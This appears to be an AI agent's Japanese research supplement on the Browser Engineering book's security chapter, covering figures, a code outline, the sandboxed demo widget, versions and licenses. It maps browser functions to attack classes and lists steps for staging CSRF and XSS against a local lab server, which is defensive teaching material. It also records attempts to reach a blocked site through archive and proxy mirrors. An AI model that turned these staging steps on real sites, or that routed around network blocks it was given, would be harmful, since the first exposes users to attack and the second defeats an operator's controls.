- 本ノートに記載したURL・コード・ヘッダ値・関数名・数値（53ビット、256ビット、約1000行、約3000行、4〜6時間、Python 3.9.10、ポート8000 など）はすべて原典（`book/*.md`, `src/*`, `config.json`, `README.md`）に実在する記述からの転記である。推論・観察に基づく箇所はすべて「〔本ノート筆者の観察（原典コードに基づく）〕」と明示した。
- 攻撃手法として記載した `XMLHttpRequest` によるユーザ名窃取、CSRFフォーム、`<script src=...>` 注入の3例は、いずれも**原典が防御の必要性を説明するために自ら提示している実証例**であり、本ノートは防御・診断目的（許可された検証およびバグバウンティ前提）の技術解説として記録している。

---

# 【第2次補完】第1次ノートで「取得できていない」とされた4項目の回収記録

> 本章は**補完担当エージェントによる追記**である。第1次ノートは末尾で (a) 図版・アニメーションGIF、(b) 各章末 Outline 節の中身、(c) 埋め込みクイズの問題文、(d) ウィジェットのインタラクティブ動作の4点を「取得できていない」と記録していた。本章はそれらを**同じローカルclone内の未調査ファイル**から回収した記録である。第1次ノートの記述は削除していない。訂正が必要な箇所は「訂正」と明記した。

## 2-0. 再取得の試行と結果（逐一記録）

| 手段 | 対象 | 結果 |
| --- | --- | --- |
| `WebFetch` | `https://browser.engineering/security.html` | **失敗**。`EGRESS_BLOCKED`（"Access to browser.engineering is blocked by the network egress proxy"）。第1次と同じくドメイン単位でブロックされている |
| `WebSearch`（二次情報の補完用） | — | **利用不可**。本セッションのWeb検索予算（200回）を使い切っていた。したがって**二次情報による補完は行えていない**（捏造を避けるため、検索で得られなかった情報は一切書いていない） |
| ローカルclone `/home/user/browserengineering/book` の再調査 | 図・ビルドスクリプト・ウィジェット | **成功**。第1次が「サイトでしか見られない」と判断した4項目は、**実際にはすべてリポジトリ内に実体があった**（図はコミット済みバイナリ、Outlineは生成スクリプト、クイズは原稿内のブロック、ウィジェットはHTML+JSランタイム） |

**結論**: 公開サイトHTMLは依然として取得できないが、**第1次ノートが挙げた4つの欠落はいずれもローカル素材から解消できた**。以下はすべて実ファイルを開いて確認した内容である。

---

## 2-A. 図版（Figure）— 画像を実際に開いて確認した内容

第1次ノートは「アニメーションGIFはMarkdownソースからは読み取れない」としていたが、**GIF本体は `www/im/` にコミットされており**、画像として開くことができた。以下は**実際に画像を表示して観察した内容の記述**である（原文キャプションの訳＋筆者による図の読み取り）。

### Figure 1: `im/security-cookies-2.gif`（第10章 Cookies 節、`book/security.md` 67–69行）

- **原文キャプションの訳**: 「サーバは `Set-Cookie` ヘッダでブラウザにcookieを割り当て、以後ブラウザは `Cookie` ヘッダで自分を識別する」
- **図の実際の内容（観察）**: 左に地球儀アイコン（赤字で `Browser`）、右にサーバラックのアイコン（赤字で `Server`）。その間を4本の横矢印が上から下へ時系列で並ぶ。
  1. Browser → Server: `GET /`
  2. Server → Browser: `Set-Cookie:...`
  3. Browser → Server: `GET /login` と `Cookie:...`（**同一の矢印に2行のラベル**。つまり2回目以降のリクエストにはcookieが自動的に載る、という点が図の主眼）
  4. Server → Browser: `<form...>`
- **教材上の読みどころ**: 3番目の矢印が本質。**ブラウザは「送れ」と指示されなくても、同じサーバへの次のリクエストに cookie を自動で付ける**。この「自動付与」こそが後段のCSRFの前提であり、図1を先に頭に入れておくとCSRF節の理解が速い。
- ファイル形式はアニメーションGIF（11,393バイト）。ファイル名末尾の `-2` は本書の図版の版管理上の連番で、静止画版 `im/security-cookies.png`（113,736バイト）も同ディレクトリに併存する。

### Figure 2: `im/security-spa-2.gif`（第10章 Cross-site Requests 節、`book/security.md` 535–536行）

- **原文キャプションの訳**: 「`XMLHttpRequest` を活用したシングルページアプリケーション（SPA）のアーキテクチャ」
- **図の実際の内容（観察）**: 上部に横長の角丸長方形 `Page`。左側に上から地球儀アイコン `Browser`、サーバラックアイコン `Server`。下部に楕円 `Request` が3つ横並び。赤い矢印が以下のように走る。
  1. `Browser` → 1つ目の `Request`（ラベル `GET`）、その `Request` → `Page`（ラベル `HTML`）
  2. `Page` → 2つ目の `Request`（ラベル `XMLHttpRequest`）、その `Request` → `Page`（ラベル `JSON or whatever`）
  3. `Page` → 3つ目の `Request`（ラベル `XMLHttpRequest`）、その `Request` → `Page`（ラベル `JSON`）
- **教材上の読みどころ**: **最初のリクエストだけがブラウザ（ナビゲーション）起点で、2回目以降はページ自身（＝JavaScript）が起点**という非対称性が図示されている。この「リクエストの起点がページに移る」ことが、同一オリジンポリシーが必要になる理由そのものである。逆に、CSRFがブロックできないのは**ナビゲーション起点のリクエスト（1番目の矢印の種類）**だという対比も、この図から説明できる。
- アニメーションGIF（21,250バイト）。静止画版 `im/security-spa.png`（164,290バイト）が併存。

### Figure 7: `im/browser-tab-frame-jscontext-2.gif`（第15章 Iframe Scripts 節、`book/embeds.md` 1636行）

- **原文キャプションの訳**: 「同一タブ内の複数フレームが単一の `JSContext` を共有しうる」
- **図の実際の内容（観察）**: 上から下への木構造。最上位に `Browser` の箱。その下に `Tab` の箱が3つ。中央の `Tab` の下に `Frame`（下に `Origin A` と注記）。その `Frame` からさらに2つの子 `Frame` が伸び、**どちらも `Origin A`**。図の右側に菱形 `JS Context` があり、**3つの `Origin A` フレームすべてから破線矢印がこの1つの菱形に集まる**。一方、左下に別の `Frame`（`Origin B`）があり、そこからは**別個の菱形 `JS Context`** へ実線矢印が伸びる。
- **教材上の読みどころ**: 「フレームの木構造」と「JSコンテキストの割り当て」が**別物**であることが一目で分かる図。**同一オリジンのフレームは何個あっても1つのJSコンテキストを共有し、異なるオリジンのフレームは隔離される**。これは `book/embeds.md` 本文の「`JSContext` を `Frame` ごとではなく `Tab` 上の『オリジン→JSコンテキスト』の辞書に持たせる」という設計記述と完全に対応する。
- 実ブラウザとの対応関係を押さえる価値が高い: この「オリジン単位でJSコンテキストをまとめる」という設計は、実ブラウザの **site isolation**（プロセス割り当ての単位）を1段簡略化したモデルになっている。第15章 `Isolation and Timing` 節と併せて読むこと。
- アニメーションGIF（16,577バイト）。高解像度静止画 `im/browser-tab-frame-jscontext.jpg`（約2.5MB）が併存。

> 〔訂正〕第1次ノートの「読者が自分で開くべき資料」項目2は「これらのアニメーション図はMarkdownソースからは読み取れない」としていたが、**Markdownソースには無くともリポジトリの `www/im/` には実体がある**。ただし**アニメーションの各フレームの動き（何がどの順に現れるか）**までは静的な閲覧では確定できないため、動きそのものはサイトで見る価値が残る。

---

## 2-B. 各章末「Outline」節の実体 — 生成方法と第10章の実際の出力

### どう生成されるか（`book/security.md` 1241–1253行、`Makefile` 44–47行、`infra/outlines.py`）

- `book/security.md` の `Outline` 節には**本文が書かれておらず**、代わりに実行すべきコマンドがブロックとして埋め込まれている。Web版と印刷版で出し分けられる。
  - Web版（`.web-only`、HTML出力）: `python3 infra/outlines.py --html src/lab10.py --template book/outline.txt`
  - 印刷版（`.print-only`、プレーンテキスト出力）: `python3 infra/outlines.py src/lab10.py --template book/outline.txt`
- 導入文の訳: 「この時点で、我々のブラウザの関数・クラス・メソッドの全体像はおおよそ次のようになっているはずだ」。
- `Makefile` のルール: `src/outline%.txt: src/lab%.py infra/inline.py infra/asttools.py infra/outlines.py book/outline.txt` → `python3 infra/outlines.py $< --template book/outline.txt > $@`。`make outlines` で第1〜16章分を一括生成する。
- **`infra/outlines.py` の動作**（読解による）:
  1. `asttools.parse` / `asttools.inline` で `src/labN.py` をASTとして読み、`@wbetools.patch` 等によるパッチ適用後の**最終的な定義**を取り出す。
  2. クラス・関数・定数を `Class` / `Function` / `Const` のデータクラスに変換する。`self` 引数は表示から落とされる。`@outline_hide` 相当のデコレータが付いた定義は**出力から除外**される。
  3. `book/outline.txt`（テンプレート）に書かれた**順序**に並べ替える。テンプレートは「ネットワーキング」「HTMLツリー」「HTMLパーサ」「CSSパーサ」…という**論理的な章立て順**であり、ソースファイル中の出現順ではない。
  4. テンプレートに無い定義が生成されると**エラーで停止する**（`assert not ol, "Template did not describe: ..."`）。つまり**本の目次と実装が乖離しないよう機械的に強制されている**。
- `book/outline.txt` 冒頭コメントの仕様（訳）: 空行とコメントは無視、クラス・関数・定数は名前で照合、引数は任意、`WIDTH, HEIGHT` のように1行に2つ書いた定数は1行にまとめて出力、テンプレートに無い定義があればエラー。

### 第10章時点の Outline（実際に生成した結果）

本補完作業で上記コマンドを**実際に実行して得た出力**（`python3 infra/outlines.py src/lab10.py --template book/outline.txt`、Python 3.11.15、全138行）。コードの構造一覧であり、リポジトリルートの `LICENSE`（MIT型）が適用される部分にあたる。

```text
COOKIE_JAR
class URL:
    def __init__(url)
    def request(referrer, payload)
    def resolve(url)
    def origin()
    def __str__()
class Text:
    def __init__(text, parent)
    def __repr__()
class Element:
    def __init__(tag, attributes, parent)
    def __repr__()
def print_tree(node, indent)
def tree_to_list(tree, list)
class HTMLParser:
    SELF_CLOSING_TAGS
    HEAD_TAGS
    def __init__(body)
    def parse()
    def get_attributes(text)
    def add_text(text)
    def add_tag(tag)
    def implicit_tags(tag)
    def finish()
class CSSParser:
    def __init__(s)
    def whitespace()
    def literal(literal)
    def word()
    def ignore_until(chars)
    def pair()
    def selector()
    def body()
    def parse()
class TagSelector:
    def __init__(tag)
    def matches(node)
class DescendantSelector:
    def __init__(ancestor, descendant)
    def matches(node)
FONTS
def get_font(size, weight, style)
DEFAULT_STYLE_SHEET
INHERITED_PROPERTIES
def style(node, rules)
def cascade_priority(rule)
WIDTH, HEIGHT
HSTEP, VSTEP
class Rect:
    def __init__(left, top, right, bottom)
    def contains_point(x, y)
INPUT_WIDTH_PX
BLOCK_ELEMENTS
class DocumentLayout:
    def __init__(node)
    def layout()
    def should_paint()
    def paint()
class BlockLayout:
    def __init__(node, parent, previous)
    def layout_mode()
    def layout()
    def recurse(node)
    def new_line()
    def word(node, word)
    def input(node)
    def self_rect()
    def should_paint()
    def paint()
class LineLayout:
    def __init__(node, parent, previous)
    def layout()
    def should_paint()
    def paint()
class TextLayout:
    def __init__(node, word, parent, previous)
    def layout()
    def should_paint()
    def paint()
class InputLayout:
    def __init__(node, parent, previous)
    def layout()
    def should_paint()
    def paint()
    def self_rect()
class DrawText:
    def __init__(x1, y1, text, font, color)
    def execute(scroll, canvas)
class DrawRect:
    def __init__(rect, color)
    def execute(scroll, canvas)
class DrawLine:
    def __init__(x1, y1, x2, y2, color, thickness)
    def execute(scroll, canvas)
class DrawOutline:
    def __init__(rect, color, thickness)
    def execute(scroll, canvas)
def paint_tree(layout_object, display_list)
EVENT_DISPATCH_JS
RUNTIME_JS
class JSContext:
    def __init__(tab)
    def run(script, code)
    def dispatch_event(type, elt)
    def get_handle(elt)
    def querySelectorAll(selector_text)
    def getAttribute(handle, attr)
    def innerHTML_set(handle, s)
    def XMLHttpRequest_send(...)
SCROLL_STEP
class Tab:
    def __init__(tab_height)
    def load(url, payload)
    def render()
    def draw(canvas, offset)
    def allowed_request(url)
    def scrolldown()
    def click(x, y)
    def go_back()
    def submit_form(elt)
    def keypress(char)
class Chrome:
    def __init__(browser)
    def tab_rect(i)
    def paint()
    def click(x, y)
    def keypress(char)
    def enter()
    def blur()
class Browser:
    def __init__()
    def draw()
    def new_tab(url)
    def handle_down(e)
    def handle_click(e)
    def handle_key(e)
    def handle_enter(e)
```

### Outline を攻撃面（attack surface）として読む — 教科書への活用指針

第1次ノートは「攻撃面を関数単位で俯瞰するのに有用」と予告していた。実物が得られたので、**第10章時点のブラウザで信頼境界をまたぐ関数**を具体的に特定できる。

| 関数・定数 | 信頼境界上の役割 | 対応する脆弱性クラス |
| --- | --- | --- |
| `COOKIE_JAR`（モジュールグローバル） | **全タブ共有**の資格情報ストア。キーはホスト名のみ | cookie の scheme/port 無視、タブ間のログイン状態共有 |
| `URL.request(referrer, payload)` | cookie の付与可否（`SameSite` 判定）を行う**唯一の地点**。`referrer` を受け取るよう第10章で変更された | CSRF、SameSite のバイパス |
| `URL.origin()` | `scheme://host:port` を組む。同一オリジン判定の**基準** | 同一オリジンポリシーの回避 |
| `JSContext.XMLHttpRequest_send(...)` | スクリプトからの任意URLフェッチの入口。ここでオリジン検査を行う | クロスオリジン情報漏洩 |
| `JSContext.innerHTML_set(handle, s)` | **文字列をHTMLとしてパースする sink**。第9章で導入され第10章でも残る | DOM系XSS |
| `JSContext.run(script, code)` | スクリプト実行の入口 | スクリプト注入 |
| `Tab.allowed_request(url)` | **Content-Security-Policy の実施点**。第10章で新設 | CSP の実装漏れ／バイパス |
| `Tab.load(url, payload)` | ナビゲーションの起点。`self.url` 更新前に referrer を渡す必要がある | referrer 取り違えによる SameSite 誤判定 |
| `Tab.submit_form(elt)` | フォーム送信＝**同一オリジンポリシーが適用されない**経路 | CSRF |
| `RUNTIME_JS` / `EVENT_DISPATCH_JS` | ブラウザがJSコンテキストへ注入する特権コード | 特権スクリプトとページスクリプトの混在 |

> 〔本ノート筆者の観察（生成結果に基づく）〕Outline に `Tab.allowed_request` が現れることが重要。第9章まで存在しなかったこのメソッドが第10章で追加されている＝**CSPの実施点はブラウザ側にただ1つ**である、という設計が一覧から読み取れる。診断の観点では「CSPを評価する地点が1つしかない」ことは、その1点の実装バグが全防御を無効化しうることを意味する。

---

## 2-C. 埋め込みクイズの実態 — 第1次ノートの記述を訂正

**訂正が必要な項目**である。第1次ノートは「サイトには `mdbook-quiz` ベースの多肢選択クイズが埋め込まれている」「原稿Markdownからは問題文が読めない」と記録していたが、リポジトリを調査した結果は次のとおり。

### 事実1: クイズは公開ビルドで**無効化**されている

`config.json` の `modes` セクション（逐語）:

```json
"modes": {
    "book":    { "show_quiz": false, "show_toc": true, "show_signup": true },
    "print":   { "show_quiz": false, "show_toc": true, "show_signup": false, "print": true },
    "onepage": { "show_toc": true }
}
```

- `book`（＝ https://browser.engineering/ の通常ビルド）と `print`（書籍版）の**両方で `show_quiz: false`**。
- `infra/filter.lua`（91–95行）は `mc-quiz` クラスのブロックを見つけたとき、`config.show_quiz` が真のときだけ `process_quiz(el)` を呼び、偽なら**ブロックごと除外**する。
- `infra/template.html` も `$if(show_quiz)$` でガードされており、無効時は `quiz_style.css` も `quiz-embed.iife.js` も**読み込まれない**。

→ **本ノートが参照したコミット時点では、公開サイトにクイズは表示されない。** `www/quiz-embed.iife.js` が存在することは「かつて使われた／再有効化できる」ことを示すに過ぎない。第1次ノートが `www/quiz-embed.iife.js` の存在からクイズの存在を推定したのは、**ファイルの存在とビルド設定を取り違えた誤り**である。

### 事実2: 全16章を通じてクイズブロックは**1個しかない**

`book/*.md` 全体を `mc-quiz` で検索した結果、ヒットは **`book/layout.md` の147行の1箇所のみ**（識別子 `#layout-tree-quiz`、クラスは `.web-only .mc-quiz`）。**第10章 `security.md` にはクイズが存在しない。**

### 事実3: その唯一のクイズの内容（第5章 Laying Out Pages）

`infra/filter.lua` の `process_mc_question`（190行以降）を読むと、クイズブロックの記法は次のとおり。

- 1つのクイズブロック内で、問題は `----------`（水平線）で区切られる。
- 各問題は「段落（＝設問文）」→「箇条書き（＝選択肢）」→「任意の段落（＝解説文 `context`）」の順。
- **箇条書きの1番目が正解**（`answer = ...content[1]`）、**2番目以降が誤答選択肢（distractors）**。
- 結果は `pandoc.json.encode` されて `data-quiz-questions` 属性に格納され、`quiz-placeholder` という div として出力される。`data-quiz-name` には識別子が入る。

この記法に照らすと、`#layout-tree-quiz` は**レイアウトツリーに関する3問**から成る（設問の要旨と、記法上の正解を示す）。

| # | 設問の要旨 | 記法上の正解（箇条書き1番目）の要旨 |
| --- | --- | --- |
| 1 | レイアウトツリーとHTMLツリーは1対1対応するか（真偽） | **偽**。対応するレイアウト要素を**持たない**HTML要素もあれば、**複数**のレイアウト要素を持つHTML要素もある |
| 2 | 一部のレイアウトモードの `layout` メソッドは再帰的に `layout` を呼ぶ。この再帰はどこで底を打つか | 子を持たないレイアウトオブジェクトのところでのみ底を打つ |
| 3 | レイアウトツリーの根・中間ノード・葉はそれぞれ何型か | 根は `DocumentLayout`、中間ノードは `BlockLayout`、葉は `InlineLayout` または `BlockLayout` |

> 〔教科書への含意〕クイズは本ノートの主題（クライアントサイド脆弱性）とは無関係な章にある1個だけであり、**セキュリティ教材としての価値はほぼない**。第1次ノートの「読みどころ」項目7（クイズ）は**削除してよい**。

---

## 2-D. ウィジェット（`widgets/labN-browser.html`）の仕組みと、その**セキュリティ上の限界**

第1次ノートは「ウィジェットのインタラクティブ動作は取得できていない」としていた。ウィジェットのHTML本体とJSランタイムはリポジトリに存在するので、**何が動き、何が動かないか**を構造から確定できる。

### 何が置かれているか

- `www/widgets/` に `lab2-browser.html` 〜 `lab16-browser.html`（第1章はブラウザUIが無いため `lab1.js` のみ）。
- 共通ランタイム `www/widgets/rt.js`（36,410バイト）、スタイル `widget.css`、そして `canvaskit.js` / `canvaskit.wasm`（第11章以降のSkia相当）、`dukpy.js`（JS評価器）、`purify.min.js`（DOMPurify）。
- **`lab10.js` や `server10.js` はリポジトリに含まれていない**。`Makefile` 82–86行のルールで**ビルド時に生成**される: `python3 infra/compile.py src/lab10.py www/widgets/lab10.js --hints src/lab10.hints`。つまり**本文に載っているPythonコードそのものを機械的にJavaScriptへトランスパイルして**ブラウザ内で動かしている。本文のコードとウィジェットの挙動が乖離しない仕掛けである。

### 第10章ウィジェットの中身（`www/widgets/lab10-browser.html`、全850バイト、逐語）

```html
<figure id="widget">
  <canvas id="canvas" width="352" height="160"></canvas>
</figure>

<script type="module">
import { rt_constants, socket, Widget } from "./rt.js";
import { constants } from "./lab10.js";
import { Browser } from "./lab8.js";
import { handle_connection } from "./server10.js";
import { URL } from "./lab8.js";

socket.accept(8000, handle_connection);
rt_constants.ROOT_CANVAS = document.querySelector("#canvas");

let widget = new Widget();
widget.run(async function() {
    constants.WIDTH = window.innerWidth;
    let url = "https://localhost:8000/";
    let b = await (new Browser()).init();
    await b.new_tab(await (new URL().init(url)));
});
widget.next();
</script>
```

読み取れること:

- **ゲストブックサーバがページ内で動く**。`socket.accept(8000, handle_connection)` により、`server10.py` 由来の `handle_connection` が**偽のポート8000**に結び付けられる。ネットワークには一切出ない。
- ブラウザの描画先は 352×160 の `<canvas>` 1枚（`rt_constants.ROOT_CANVAS`）。`tkinter` の描画呼び出しが `rt.js` 内のシムでCanvas 2Dコンテキストに変換される。
- 初期URLは `https://localhost:8000/` で、第10章のcookie／ログイン／CSRF／XSS／CSPの流れを**そのまま追体験できる**。

### `rt.js` が偽装しているもの（Pythonの標準ライブラリ相当）

`rt.js` は `socket`, `ssl`, `sys`, `tkinter`, `dukpy`, `urllib`, `html`, `random`, `wbetools` をエクスポートする。主な作り:

- `class socket`: `AF_INET` / `SOCK_STREAM` / `IPPROTO_TCP` を定数として持ち、ソケット生成時に family/type/proto を `console.assert` で検証する。`makefile` は `encoding == "utf8"` かつ `newline == "\r\n"` のみ許可。閉じたソケットからの読み出しも assert で弾く。**実際のTCPは張らず、`socket.accept` で登録されたハンドラへループバックする**。
- `class ssl`: `wrap_socket` はホスト名が `server_hostname` と一致するかを assert するだけ。**TLSは実際には行われない**。
- `class tkinter`: Canvas への描画シム。`init_window` でイベントを結線する。
- `class dukpy`: JS評価。失敗時は `JSInterpreterError` / `JSExecutionError` を投げる。

### **ウィジェットで再現できないこと（診断教材として重要）**

`rt.js` には次のエラークラスが定義されている（67–79行、逐語）:

```javascript
class ExpectedError extends Error { /* ... */ }

class WidgetXHRError extends ExpectedError {
    constructor(hostname) {
        super("This widget cannot access " + hostname + " due to sandboxing, " +
              "but the book's Python code should work correctly.");
        this.name = "WidgetXHRError";
    }
}
```

メッセージの訳: 「このウィジェットはサンドボックスのため `<hostname>` にアクセスできないが、本書のPythonコードなら正しく動作するはずだ」。

- **含意**: ウィジェットは**偽ソケットに登録されたホスト（`localhost:8000`）以外へは一切リクエストできない**。したがって第10章の「攻撃者サイトから被害者サイトへクロスオリジン `XMLHttpRequest` を投げる」という**攻撃シナリオそのものは、ウィジェット内では実行できない**。攻撃側のオリジンを用意する手段が無いからである。
- したがって、ウィジェットで確認できるのは主に「**同一オリジン側の挙動**」——ログイン、cookieの自動付与、nonce付きフォーム、XSSペイロードの投入と（エスケープ後の）無害化、CSPによるスクリプトのブロック——であり、**クロスオリジン攻撃の成否は `src/lab10.py` と `src/server10.py` をローカルのPythonで動かして確認する必要がある**。
- 第1次ノートの「読みどころ」項目3は「`SameSite=Lax` でクロスサイトPOSTのcookieが落ちる様子を自分で触って確認できる」と書いていたが、**これは訂正を要する**。クロスサイトを作れない以上、`SameSite` の効果はウィジェットでは観測できない。ローカル実行（後述）が必要。

### ローカルで攻撃シナリオを再現する手順（`README.md` と本文の記述から構成）

1. `cd src/` して `python3 server10.py` でゲストブックを起動（ポート8000）。
2. 別ターミナルで `python3 lab10.py http://localhost:8000/` としてブラウザを起動。
3. 攻撃者サイト役として**別ポート**で任意の静的サーバを立て、そこに第10章のCSRFフォームやXSSペイロードを置く。ホスト名／ポートが異なれば `URL.origin()` の値が変わるため、同一オリジンポリシーと `SameSite` の判定を実際に踏める。
4. 第10章の節順（Cookies → Login → Implementing Cookies → Cross-site Requests → Same-origin Policy → CSRF → SameSite → XSS → CSP）に沿って、**防御コードを入れる前と後**で挙動を比較すると教材効果が最大化する。

---

## 2-E. 動作環境・依存バージョン — 第1次ノートの「Python 3.9.10」を補正

第1次ノートは `README.md` から「Python 3.9.10 で動作確認」と記録した。これは `README.md` の記述としては正しいが、**リポジトリ内に、より新しく、かつ互いに食い違う記述が3か所ある**。教科書に書く際はこの食い違いごと伝えるのが誠実である。

| 出典 | 記述内容 |
| --- | --- |
| `README.md` | 「最近の Python 3。バージョン 3.9.10 で動作することが分かっているが、より古いものでもおそらく動く」（原文は `3.9.10is` と空白が抜けたタイポあり）。第9章以降 `dukpy`、第11章以降 `skia` と `pysdl2` が必要 |
| `book/porting.md`（第1次ノート未調査のファイル） | 「本書のコードは特定のライブラリバージョン向けに開発・テストされた。**Python 3.14、Skia 138、Tk 8.6.14、DukPy 0.3.0、PySDL2 0.9.15** を含む」 |
| `requirements.txt` | `dukpy==0.5.0` / `skia-python==144.0.post1` / `pybind11==3.0.1` / `PySDL2==0.9.17` / `pysdl2-dll==2.32.0` / `PyOpenGL==3.1.10` |

> 〔本ノート筆者の観察〕`porting.md` は DukPy 0.3.0・Skia 138 と書くが `requirements.txt` は dukpy 0.5.0・skia-python 144 を固定しており、**両者は一致しない**。実際に動かすなら `requirements.txt` を正とするのが妥当（ビルドが参照するのはこちら）。`README.md` の 3.9.10 は最も古い記述で、**現行コードの前提ではない可能性が高い**。

### `book/porting.md` という章の存在（第1次ノートの目次に無い）

- タイトル: *Porting WBE to Recent Software Releases*（「WBEを最近のソフトウェアリリースへ移植する」）。
- `config.json` の `chapters` には**登録されていない**ため、通常の章立てには現れない補助ページ。
- 内容: ライブラリのバージョン差でコードをどう書き換えるかの記録。例として「Skia 87 への移植」節があり、**書籍版第1刷は Skia 87 を使っており、オンライン版の Skia 138 にある `SamplingOptions` API が無かった**ため、第15章の `parse_image_rendering` が旧 `FilterQuality` API を使う別実装になっていたことが説明されている。
- **教材上の価値**: 「同じ本の版によってコードが違う」ことの実例であり、**書籍版（Oxford University Press）とオンライン版は同一ではない**という重要な注意喚起になる。教科書で本書を参照する際は、**オンライン版を正とし、参照日を明記する**のが安全。

---

## 2-F. 【最重要】ライセンス — 本文とコードで条件が異なる

本補完作業で `LICENSE` ファイル群を確認した。**教科書執筆に直結する制約**なので明記する。

| 対象 | ファイル | 条件 |
| --- | --- | --- |
| **コード**（`src/`, `infra/`, `www/` 等のソフトウェア） | リポジトリルート `LICENSE` | 「Copyright 2018-2023 Pavel Panchekha & Chris Harrelson.」に続くMIT型の許諾。使用・複製・改変・結合・公開・配布・サブライセンス・販売が無償で許可される。**条件は著作権表示と許諾表示を複製物に含めること**。無保証条項あり |
| **本文（各章のプロース）** | `book/LICENSE` | 「Chapter contents copyright 2018-2021 Pavel Panchekha & Chris Harrelson. **All rights reserved.**」＝**全権留保**。オープンライセンスではない |
| ウィジェットの第三者コード | `www/widgets/LICENSE` | `purify.min.js`（DOMPurify）等は各々のライセンスに従う旨 |

### 教科書執筆時の実務指針（本ノートの利用者へ）

1. **本文の文章は全権留保である。** 本ノートの前半には調査目的で原文が逐語で多数引用されているが、**それをそのまま教科書に転載してはならない**。教科書では**自分の言葉で書き直し（要約・再構成）、出典として章URLを明記する**こと。引用が本当に必要な箇所だけ、短く、引用と分かる形にとどめる。
2. **コードはMIT型なので再利用しやすい**が、**著作権表示と許諾表示を添える義務**がある。`src/lab10.py` や `src/server10.py` の断片を教科書に載せる場合は、「Copyright 2018-2023 Pavel Panchekha & Chris Harrelson, MIT License, https://github.com/browserengineering/book」といった出典・ライセンス表示を付ける。
3. **図版（`www/im/*.gif`, `*.png`, `*.jpg`）は本文側の成果物とみなすのが安全。** 転載せず、**本ノート 2-A のような自分の言葉による記述**か、**自作の図**に置き換えること。
4. 疑義があれば著者が窓口を公開している（`author@browser.engineering`、GitHub Issues／Discussions）。教育利用について著者は `README.md` で「読者や本書を使いたい教育者からの連絡をいつでも歓迎する」と述べており、**教科書での利用可否は直接問い合わせるのが最も確実**。

---

## 2-G. 「読者が自分で開くべき資料」節の改訂（第1次ノートの同名節を置き換える）

第1次ノートの同名節のうち、**項目2（図）・項目4（Outline）・項目7（クイズ）は本補完で解消または訂正された**。改訂版を以下に示す。第1次ノートの項目1・3・5・6・8は有効なので維持し、必要な補正のみ加える。

### なぜ原典ページを自動取得できないか（現状）

- `browser.engineering` は本作業環境の**エージェントプロキシで403（`connect_rejected`）**。`WebFetch` は `EGRESS_BLOCKED` を返す。`web.archive.org` / `r.jina.ai` / `webcache.googleusercontent.com` も同様。第2次補完でも状況は変わらなかった。
- **代替手段（確立済み・再現可能）**: `github.com` と `raw.githubusercontent.com` は到達できる。
  ```
  GIT_LFS_SKIP_SMUDGE=1 git clone --depth 1 https://github.com/browserengineering/book
  ```
  これで**本文Markdown・全ソースコード・全図版・ウィジェット・ビルド設定**が一括で手に入る。本ノートの内容はすべてここから確認した（commit `c8c6d34b636a0fec3589a4a2e901916c774f1929`）。
- **リポジトリからも得られない唯一のもの**: 生成済みHTMLページのレイアウト、アニメーションGIFのコマ送りの動き、そして**実際にブラウザ上で動くウィジェットの操作感**。これらだけはサイトを開く必要がある。

### 読みどころ（優先順位つき・改訂版）

1. **https://browser.engineering/security.html（第10章 Keeping Data Private）** — 何を学ぶために読むか: **「機能を足すと防御が必要になる」という因果の連鎖を、実装コードで追体験するため。** cookieを足す→盗まれる→XHRを足す→同一オリジンポリシーが要る→フォーム送信は素通り→CSRF→nonce→それでも漏れる→SameSite→自サイト経由の注入→XSS→エスケープ漏れに備えてCSP、という順序自体が教材。章末6問の演習（`document.cookie`／`HttpOnly`、CORS、`Referrer-Policy`）は手を動かす題材。
2. **https://browser.engineering/embeds.html の `Isolation and Timing` 節（第15章）** — 何を学ぶために読むか: **Web層（同一オリジンポリシー）の下にあるプロセス層・CPU層の防御を知るため。** site isolation、rasterizerの `seccomp` サンドボックス、Spectre/Meltdown、`SharedArrayBuffer` の再有効化に必要なヘッダ要件。第10章だけでは「なぜ論理的な防御だけでは足りないのか」が分からない。**本ノート 2-A の Figure 7 と併読すると、オリジン単位でJSコンテキストを束ねる設計が site isolation の簡略版だと理解できる。**
3. **https://browser.engineering/widgets/lab10-browser.html（第10章のウィジェット）** — 何を学ぶために読むか: **ログイン・cookie自動付与・nonce・XSS・CSPの「同一オリジン側の挙動」を、環境構築なしに触って確かめるため。** ただし**クロスオリジン攻撃はサンドボックスにより再現不可**（本ノート 2-D の `WidgetXHRError` 参照）。SameSiteや同一オリジンポリシーの効果を見たい場合は、ローカルで `python3 server10.py` と `python3 lab10.py` を動かし、攻撃者役の別ポートを自分で立てること。
4. **https://browser.engineering/skipped.html（What Wasn't Covered）** — 何を学ぶために読むか: **本書の守備範囲の外側を把握し、教科書の「次に読むべき資料」節を設計するため。** TLSの詳細、プライバシー、third-party cookie、フィンガープリンティング、JITとWebAssemblyなど、意図的に割愛された領域の一覧。
5. **https://browser.engineering/onepage.html（ワンページ版）** — 何を学ぶために読むか: **特定のヘッダ名やAPI名が全16章のどこで登場するかを横断検索するため。** 全章が1ページにまとまるのでブラウザ内検索が効く。ただし**リポジトリを clone すれば `grep -rn` で同じことがより高速にできる**ので、clone できる環境なら優先度は下がる。
6. **https://browser.engineering/preface.html（Preface）** — 何を学ぶために読むか: **この教材ブラウザをどこまで信用してよいかの境界を知るため。** 著者自身が「本書のブラウザは**悪意ある入力に対して堅牢ではない**」「標準のごく一部しか扱わない」と明言している。一方で「アーキテクチャは実ブラウザと一致する」とも述べており、**どの知見が実ブラウザに転用でき、どれができないか**の判断基準になる。
7. **`book/porting.md`（サイト上の対応ページ、または clone 後のファイル）** — 何を学ぶために読むか: **書籍版とオンライン版でコードが異なる実例を知るため。** 書籍版第1刷は Skia 87、オンライン版は Skia 138 を前提とし、第15章の実装が異なる。参照時は版と日付を明記すべき理由の具体例。

### 取得できないものへの代替手段（まとめ）

| 欲しいもの | 自動取得の可否 | 代替手段 |
| --- | --- | --- |
| 本文（全16章＋付録） | サイトは不可 | **clone した `book/*.md` が原稿そのもの**。ファイル名 `<name>.md` ↔ URL `<name>.html` |
| 全ソースコード | サイトは不可 | clone した `src/lab1.py` 〜 `lab16.py`、`server8/9/10/12.py`、`runtime*.js` |
| 図・アニメーションGIF | サイトは不可 | **clone した `www/im/` にすべて実体がある**（本ノート 2-A で3点を確認済み） |
| 各章末 Outline 節 | サイトは不可 | **`python3 infra/outlines.py src/labN.py --template book/outline.txt` で自分で生成できる**（本ノート 2-B に第10章分を掲載） |
| クイズ | — | **公開ビルドでは無効（`show_quiz: false`）。全16章で実在するのは第5章の1個のみ**（本ノート 2-C） |
